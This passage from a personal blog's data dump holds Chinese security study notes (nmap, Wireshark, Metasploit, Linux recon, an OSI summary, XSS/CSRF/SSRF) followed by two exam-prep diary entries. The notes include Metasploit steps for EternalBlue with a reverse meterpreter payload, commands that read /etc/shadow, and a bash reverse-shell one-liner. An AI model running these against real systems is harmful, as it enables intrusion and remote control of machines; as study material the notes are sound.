title=\"工作原理\"></a>工作原理</h4><p>1）通过探索了解整个web页面结果</p>\n<p>2）通过分析，使用扫描规则库对修改的HTTP Request进行攻击尝试</p>\n<p>3）分析 Response 来验证是否存在安全漏洞</p>\n<h3 id=\"wireshark\"><a href=\"#wireshark\" class=\"headerlink\" title=\"wireshark\"></a>wireshark</h3><h4 id=\"软件功能\"><a href=\"#软件功能\" class=\"headerlink\" title=\"软件功能\"></a>软件功能</h4><p>1、分析网络底层协议；<br> 2、解决网络故障问题；<br> 3、找寻网络安全问题；</p>\n<h4 id=\"软件原理\"><a href=\"#软件原理\" class=\"headerlink\" title=\"软件原理\"></a>软件原理</h4><p>当信息以明文的形式在网络上传输时，便可以使用网络监听的方式来进行攻击。<code>将网络接口设置在监听模式，便可以将网上传输的源源不断的信息截获。</code>嗅探技术常常用于网络故障诊断、协议分析、应用性能分析和网络安全保障等各个领域</p>\n<h4 id=\"过滤\"><a href=\"#过滤\" class=\"headerlink\" title=\"过滤\"></a>过滤</h4><h4 id=\"协议过滤\"><a href=\"#协议过滤\" class=\"headerlink\" title=\"协议过滤\"></a>协议过滤</h4><p>tcp，只显示TCP协议的数据包列表<br> http，只查看HTTP协议的数据包列表<br> icmp，只显示ICMP协议的数据包列表</p>\n<h4 id=\"ip过滤\"><a href=\"#ip过滤\" class=\"headerlink\" title=\"ip过滤\"></a>ip过滤</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip.src ==192.168.1.104 显示源地址为192.168.1.104的数据包列表</span><br><span class=\"line\">ip.dst==192.168.1.104, 显示目标地址为192.168.1.104的数据包列表</span><br><span class=\"line\">ip.addr == 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"端口过滤\"><a href=\"#端口过滤\" class=\"headerlink\" title=\"端口过滤\"></a>端口过滤</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.port ==80,  显示源主机或者目的主机端口为80的数据包列表。</span><br><span class=\"line\">tcp.srcport == 80,  只显示TCP协议的源主机端口为80的数据包列表。</span><br><span class=\"line\">tcp.dstport == 80，只显示TCP协议的目的主机端口为80的数据包列表。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Http模式过滤\"><a href=\"#Http模式过滤\" class=\"headerlink\" title=\"Http模式过滤\"></a>Http模式过滤</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http.request.method==“GET”, 只显示HTTP GET方法的</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"逻辑运算符为-and-or-not\"><a href=\"#逻辑运算符为-and-or-not\" class=\"headerlink\" title=\"逻辑运算符为 and&#x2F;or&#x2F;not\"></a>逻辑运算符为 and&#x2F;or&#x2F;not</h4><p>过滤多个条件组合时，使用and&#x2F;or。比如获取IP地址为192.168.1.104的ICMP数据包表达式为：<code>ip.addr == 192.168.1.104 and icmp</code></p>\n<h3 id=\"nmap\"><a href=\"#nmap\" class=\"headerlink\" title=\"nmap\"></a>nmap</h3><table>\n<thead>\n<tr>\n<th>参数(注意区分大小写)</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-sT</td>\n<td>TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。</td>\n</tr>\n<tr>\n<td>-sS</td>\n<td>半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。</td>\n</tr>\n<tr>\n<td>-sF  -sN</td>\n<td>秘密FIN数据包扫描、Xmas Tree、Null扫描模式</td>\n</tr>\n<tr>\n<td>-sP</td>\n<td>ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。</td>\n</tr>\n<tr>\n<td>-sU</td>\n<td>UDP扫描，但UDP扫描是不可靠的</td>\n</tr>\n<tr>\n<td>-sA</td>\n<td>这项高级的扫描方法通常用来穿过防火墙的规则集</td>\n</tr>\n<tr>\n<td>-sV</td>\n<td>探测端口服务版本</td>\n</tr>\n<tr>\n<td>-Pn</td>\n<td>扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描</td>\n</tr>\n<tr>\n<td>-v</td>\n<td>显示扫描过程，推荐使用</td>\n</tr>\n<tr>\n<td>-h</td>\n<td>帮助选项，是最清楚的帮助文档</td>\n</tr>\n<tr>\n<td>-p</td>\n<td>指定端口，如“1-65535、1433、135、22、80”等</td>\n</tr>\n<tr>\n<td>-O</td>\n<td>启用远程操作系统检测，存在误报</td>\n</tr>\n<tr>\n<td>-A</td>\n<td>全面系统检测、启用脚本检测、扫描等</td>\n</tr>\n<tr>\n<td>-oN&#x2F;-oX&#x2F;-oG</td>\n<td>将报告写入文件，分别是正常、XML、grepable 三种格式</td>\n</tr>\n<tr>\n<td>-T4</td>\n<td>针对TCP端口禁止动态扫描延迟超过10ms</td>\n</tr>\n<tr>\n<td>-iL</td>\n<td>读取主机列表，例如，“-iL C:\\ip.txt”</td>\n</tr>\n</tbody></table>\n<p><strong>1、扫描单个目标</strong></p>\n<p>nmap ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n<p><strong>2、扫描多个目标</strong></p>\n<p>nmap ip1 ip2 适用于目标地址不再同一个网段或在同一网段不连续且数量不多的情况。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap 192.168.0.101 192.168.0.110</span><br></pre></td></tr></table></figure>\n\n<p><strong>3、扫描一个范围内的目标</strong></p>\n<p>nmap xxx.xxx.xxx.xxx-xxx</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap 192.168.0.100-110</span><br></pre></td></tr></table></figure>\n\n<p><strong>4、扫描目标地址所在某网段</strong></p>\n<p>namp xxx.xxx.xxx.xxx&#x2F;xx</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap 192.168.0.1/24</span><br></pre></td></tr></table></figure>\n\n<p><strong>5、扫描包含主机列表的文件中的所有地址</strong></p>\n<p>nmap -iL <File path></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap -iL /root/target.txt</span><br></pre></td></tr></table></figure>\n\n<p><strong>6、扫描除了一个目标地址之外的所有地址</strong></p>\n<p>nmap ip段 -exclude 被排除的ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap 192.168.0.100-110 -exclude 192.168.0.103</span><br><span class=\"line\">   nmap 192.168.0.1/24 -exclude 192.168.0.103 </span><br></pre></td></tr></table></figure>\n\n<p><strong>7、扫描目标地址的指定端口</strong></p>\n<p>nmap ip -p 端口1，端口2，端口3……</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如:nmap 192.168.0.101 -p 80,8080,3306,3389</span><br></pre></td></tr></table></figure>\n\n<p><strong>8、扫描目标地址C段的在线主机</strong></p>\n<p>nmap -sP ip段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap -sP 192.168.0.1/24</span><br></pre></td></tr></table></figure>\n\n<p><strong>9、扫描目标地址操作系统版本进行探测</strong></p>\n<p>nmap -O ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap -O 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n<p><strong>10、扫描目标所开放的全部端口（半开式）</strong></p>\n<p>nmap -sS -p 端口号(多个用“,”隔开) -v ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如：nmap -sS -p 1-65535 192.168.0.101</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"MSF\"><a href=\"#MSF\" class=\"headerlink\" title=\"MSF\"></a>MSF</h3><h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>Metasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。</p>\n<p>它本身附带数百个已知软件漏洞，<strong>是一款专业级漏洞攻击工具</strong></p>\n<h4 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h4><p>根据漏洞名称搜索 : <code>search ms17_010</code></p>\n<p>1、运用辅助模块扫描目标</p>\n<p>设置模块：<code>use auxiliary/scanner/smb/smb_ms17_010</code></p>\n<p>查看设置：<code>options</code> </p>\n<p>设置目标地址：<code>set rhosts 192.168.174.129</code></p>\n<p>目标端口默认是445，如果用nmap端口扫描windows文件共享服务不是开放在445端口上面，那这里需要进行修改，<code>set rport 目标端口</code></p>\n<p>设置好了之后，<code>run</code>或者<code>exploit</code> 进行攻击</p>\n<p>2、设置攻击模块对目标进行攻击</p>\n<p>使用攻击模块：<code>use exploit/windows/smb/ms17_010_eternalblue</code></p>\n<p>查看所需设置：<code>options</code> </p>\n<p>设置目标地址：<code>set RHOSTS 192.168.174.129</code></p>\n<p>设置目标端口：<code>set RPORT 445</code></p>\n<p>设置payload：<code>set payload windows/x64/meterpreter/reverse_tcp</code></p>\n<p>设置本地地址：<code>set LHOST 192.168.174.192</code></p>\n<p>攻击：<code>run</code>或者<code>exploit</code> </p>\n<h3 id=\"Linux命令\"><a href=\"#Linux命令\" class=\"headerlink\" title=\"Linux命令\"></a>Linux命令</h3><p><strong>命令：netstat</strong></p>\n<p>用途：查看系统的网络连接状态、路由表、接口统计等信息</p>\n<p>格式：netstat [选项]</p>\n<p>常用选项：</p>\n<ul>\n<li>-a：显示所有活动连接</li>\n<li>-n：以数字形式显示</li>\n<li>-p：显示进程信息</li>\n<li>-t：查看TCP协议相关信息</li>\n<li>-u：查看UDP协议相关信息</li>\n<li>-r：显示路由表信息</li>\n</ul>\n<p><strong>命令：network</strong></p>\n<p>用途：启用、禁用网络接口配置</p>\n<p>重启network格式：service network restart</p>\n<p><strong>命令：chmod</strong></p>\n<p>用途：权限控制命令</p>\n<p>Linux系统下文件权限显示如下图所示，第一个数字，数字代表的意义为：</p>\n<ul>\n<li>– 普通文件</li>\n<li>d 目录</li>\n<li>s socket套接字</li>\n<li>l 软链接</li>\n<li>p 管道</li>\n<li>c 字符设备</li>\n<li>b 块设备</li>\n</ul>\n<p><code>uname -a</code>: 此命令可以查看当前Linux系统内核具体版本、使用的发行版版本、以及当前处理器架构!(这里的架构非常重要,大部分针对Linux攻击载荷都需要明确处理器架构才能使用)</p>\n<p>存放系统信息的文件</p>\n<ul>\n<li>cat &#x2F;etc&#x2F;issue: 连接系统时显示的提示信息,默认一般会存放发行版名称等信息(PS:用户可能会把这个当成备忘录存放一些口令)</li>\n<li>cat &#x2F;etc&#x2F;<em>-release: 详细的发行版系统版本信息(不同的发行版可能名字会略有不同,并且此文件可能有多个,这种情况下我们可以使用通配符</em>来解决这个问题。ls &#x2F;etc | grep “release””可以使用此命令来查看你系统中此文件夹具体有哪些!)</li>\n<li>cat &#x2F;proc&#x2F;version: 详细的系统内核信息,用于编译内核的gcc的版本以及内核编译的时间。</li>\n<li>cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;version: 系统内核信息,相当uname -v(&#x2F;proc&#x2F;sys&#x2F;kernel文件夹中可以监视和调整Linux内核中的各种活动!但需要管理员权限!)</li>\n</ul>\n<p>进程信息</p>\n<pre><code>ps: 列出本用户当前使用的终端中运行的进程\n    ps -elf: 显示详细的(-l)带UID,PPIP,C与STIME栏位(-f)现行终端机下的所有进程(-e)\n    ps aux: 已用户为主的格式(u)显示所有用户(a)的所有终端机(x)下的所有进程\ntop: 类似Windows的任务管理器\n</code></pre>\n<p><code>cat /etc/passwd</code>: 可以登录系统或其他拥有正在运行的进程的操作系统的用户身份信息</p>\n<p><code>cat /etc/shadow</code>: 所有用户的密码安全策略,一般只有超级用户对此文件夹才有访问权限!</p>\n<p><code>cat /etc/sudoers</code>: 对权限的分配管理   </p>\n<p><code>ifconfig -a</code>: 查看网络、网卡相关信息</p>\n<p><code>hostname</code>: 显示、设置系统的主机名称</p>\n<h4 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"OSI模型\"><a href=\"#OSI模型\" class=\"headerlink\" title=\"OSI模型\"></a>OSI模型</h3><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440002.png\"\n                        alt=\"图片-1685330434325\"\n                 ><strong>应用层：为应用程序或用户请求提供各种请求服务。</strong>OSI参考模型最高层，也是最靠近用户的一层，为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务。</p>\n<p><strong>表示层：数据编码、格式转换、数据加密。</strong>提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p>\n<p><strong>会话层：创建、管理和维护会话。</strong>接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。</p>\n<p><strong>传输层：数据通信。</strong>建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。</p>\n<p><strong>网络层：IP选址及路由选择。</strong>通过路由选择算法，为报文或通信子网选择最适当的路径。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进&#x2F;出路由等控制，将信息从一个网络设备传送到另一个网络设备。</p>\n<p><strong>数据链路层：提供介质访问和链路管理。</strong>接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层；负责建立和管理节点间的链路，通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</p>\n<p><strong>物理层：管理通信设备和网络媒体之间的互联互通。</strong>传输介质为数据链路层提供物理连接，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，屏蔽具体传输介质和物理设备的差异。</p>\n<h3 id=\"TCP-IP五层模型\"><a href=\"#TCP-IP五层模型\" class=\"headerlink\" title=\"TCP&#x2F;IP五层模型\"></a>TCP&#x2F;IP五层模型</h3><h4 id=\"区别\"><a href=\"#区别\" class=\"headerlink\" title=\"区别\"></a><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440451.png\"\n                        alt=\"图片-1685330444867\"\n                 >区别</h4><p>TCP&#x2F;IP协议中的应用层处理开放式系统互联模型（OSI）中的第五层、第六层和第七层的功能。</p>\n<p>TCP&#x2F;IP协议中的传输层不能保证数据包在该层总是能够安全可靠地传输，而开放式系统互联模型（OSI）可以做到。</p>\n<p>TCP&#x2F;IP协议还提供一项名为UDP（用户数据报协议）的选择。</p>\n<h3 id=\"xss，csrf，ssrf区别\"><a href=\"#xss，csrf，ssrf区别\" class=\"headerlink\" title=\"xss，csrf，ssrf区别\"></a>xss，csrf，ssrf区别</h3><p><strong>相同点：</strong><br> XSS，CSRF,SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。</p>\n<p><strong>不同点：</strong><br> XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行。</p>\n<p>CSRF(跨站请求伪造)是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。  </p>\n<p>SSRF(服务端请求伪造）是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器</p>\n"},{"title":"考研日记04-10","date":"2024-04-10T13:41:56.000Z","excerpt":"记录考研","_content":"# 2024 4 10\n\n## 学习时间\n\n- 7h14min\n\n## MATH\n\n- 第六讲基础过完，习题未写 p124\n\n  \n\n## ENGLISH\n\n- 才30个... 慢慢增加吧\n\n## 408\n\n- 将队列过了一遍，并将之前的题目做完了，跟着b站的一些解析对之前不懂的地方逐步了解了\n\n\n\n## 杂记\n\n今天状态挺不错的，早上还是有时候会赖床，然后每天12点之前必须睡觉\n\n现在每天疑惑的地方是对记单词的时间没有一个较好的规划，这几天对英语单词做一个好的规划！\n\n","source":"_posts/2024_4_10.md","raw":"---\ntitle: 考研日记04-10\ndate: 2024-04-10 21:41:56\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 4 10\n\n## 学习时间\n\n- 7h14min\n\n## MATH\n\n- 第六讲基础过完，习题未写 p124\n\n  \n\n## ENGLISH\n\n- 才30个... 慢慢增加吧\n\n## 408\n\n- 将队列过了一遍，并将之前的题目做完了，跟着b站的一些解析对之前不懂的地方逐步了解了\n\n\n\n## 杂记\n\n今天状态挺不错的，早上还是有时候会赖床，然后每天12点之前必须睡觉\n\n现在每天疑惑的地方是对记单词的时间没有一个较好的规划，这几天对英语单词做一个好的规划！\n\n","slug":"2024_4_10","published":1,"updated":"2024-04-12T15:42:03.134Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvdg2y4800006y76h6yycdgn","content":"<h1 id=\"2024-4-10\"><a href=\"#2024-4-10\" class=\"headerlink\" title=\"2024 4 10\"></a>2024 4 10</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>7h14min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第六讲基础过完，习题未写 p124</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>才30个… 慢慢增加吧</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>将队列过了一遍，并将之前的题目做完了，跟着b站的一些解析对之前不懂的地方逐步了解了</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天状态挺不错的，早上还是有时候会赖床，然后每天12点之前必须睡觉</p>\n<p>现在每天疑惑的地方是对记单词的时间没有一个较好的规划，这几天对英语单词做一个好的规划！</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"2024-4-10\"><a href=\"#2024-4-10\" class=\"headerlink\" title=\"2024 4 10\"></a>2024 4 10</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>7h14min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第六讲基础过完，习题未写 p124</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>才30个… 慢慢增加吧</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>将队列过了一遍，并将之前的题目做完了，跟着b站的一些解析对之前不懂的地方逐步了解了</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天状态挺不错的，早上还是有时候会赖床，然后每天12点之前必须睡觉</p>\n<p>现在每天疑惑的地方是对记单词的时间没有一个较好的规划，这几天对英语单词做一个好的规划！</p>\n"},{"title":"考研日记04-11","date":"2024-04-11T15:22:31.000Z","excerpt":"记录考研","_content":"# 2024 4 11\n\n## 学习时间\n\n- 8h26min\n\n\n\n## MATH\n\n- 定积分基本概念过完 p148（题未写）\n\n  \n\n## ENGLISH\n\n- 没有背。。。真的要改一改了！晚上回去一定背！\n\n\n\n## 408\n\n- 第三章基本完结，需要看一下习题的讲解 p112\n\n\n\n## 杂记\n\n最近在用番茄todo记录学时间，感觉最近的状态也越来越好了，希望能坚持下去。\n\n每天好好利用时间，不要浪费时间。\n\n最近的屏幕每日使用时长也慢慢降下来了，希望以后能降低到4h（包括记单词的1h）\n\n最近感慨挺多，不过也算是一个好的开始了吧，想想我的考研正式开始也是清明节后面了，一分一秒我都不能浪费！（好怕英语没过国家线，怕也没用)\n\n\n![截屏2024-03-30 16.58.15](https://github.com/R3damancy1/picx-images-hosting/raw/master/7f25371ca328dc735b59c1782e942add.6ik2q5k3el.jpg)\n","source":"_posts/2024_4_11.md","raw":"---\ntitle: 考研日记04-11\ndate: 2024-04-11 23:22:31\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 4 11\n\n## 学习时间\n\n- 8h26min\n\n\n\n## MATH\n\n- 定积分基本概念过完 p148（题未写）\n\n  \n\n## ENGLISH\n\n- 没有背。。。真的要改一改了！晚上回去一定背！\n\n\n\n## 408\n\n- 第三章基本完结，需要看一下习题的讲解 p112\n\n\n\n## 杂记\n\n最近在用番茄todo记录学时间，感觉最近的状态也越来越好了，希望能坚持下去。\n\n每天好好利用时间，不要浪费时间。\n\n最近的屏幕每日使用时长也慢慢降下来了，希望以后能降低到4h（包括记单词的1h）\n\n最近感慨挺多，不过也算是一个好的开始了吧，想想我的考研正式开始也是清明节后面了，一分一秒我都不能浪费！（好怕英语没过国家线，怕也没用)\n\n\n![截屏2024-03-30 16.58.15](https://github.com/R3damancy1/picx-images-hosting/raw/master/7f25371ca328dc735b59c1782e942add.6ik2q5k3el.jpg)\n","slug":"2024_4_11","published":1,"updated":"2024-04-12T15:45:11.074Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvdg2y4j00016y7674hwb68j","content":"<h1 id=\"2024-4-11\"><a href=\"#2024-4-11\" class=\"headerlink\" title=\"2024 4 11\"></a>2024 4 11</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>8h26min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>定积分基本概念过完 p148（题未写）</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>没有背。。。真的要改一改了！晚上回去一定背！</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>第三章基本完结，需要看一下习题的讲解 p112</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>最近在用番茄todo记录学时间，感觉最近的状态也越来越好了，希望能坚持下去。</p>\n<p>每天好好利用时间，不要浪费时间。</p>\n<p>最近的屏幕每日使用时长也慢慢降下来了，希望以后能降低到4h（包括记单词的1h）</p>\n<p>最近感慨挺多，不过也算是一个好的开始了吧，想想我的考研正式开始也是清明节后面了，一分一秒我都不能浪费！（好怕英语没过国家线，怕也没用)</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://github.com/R3damancy1/picx-images-hosting/raw/master/7f25371ca328dc735b59c1782e942add.6ik2q5k3el.jpg\"\n                        alt=\"截屏2024-03-30 16.58.15\"\n                 ></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"2024-4-11\"><a href=\"#2024-4-11\" class=\"headerlink\" title=\"2024 4 11\"></a>2024 4 11</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>8h26min</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>定积分基本概念过完 p148（题未写）</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>没有背。。。真的要改一改了！晚上回去一定背！</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>第三章基本完结，需要看一下习题的讲解 p112</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>最近在用番茄todo记录学时间，感觉最近的状态也越来越好了，希望能坚持下去。</p>\n<p>每天好好利用时间，不要浪费时间。</p>\n<p>最近的屏幕每日使用时长也慢慢降下来了，希望以后能降低到4h（包括记单词的1h）</p>\n<p>最近感慨挺多，不过也算是一个好的开始了吧，想想我的考研正式开始也是清明节后面了，一分一秒我都不能浪费！（好怕英语没过国家线，怕也没用)</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://github.com/R3damancy1/picx-images-hosting/raw/master/7f25371ca328dc735b59c1782e942add.6ik2q5k3el.jpg\"\n                        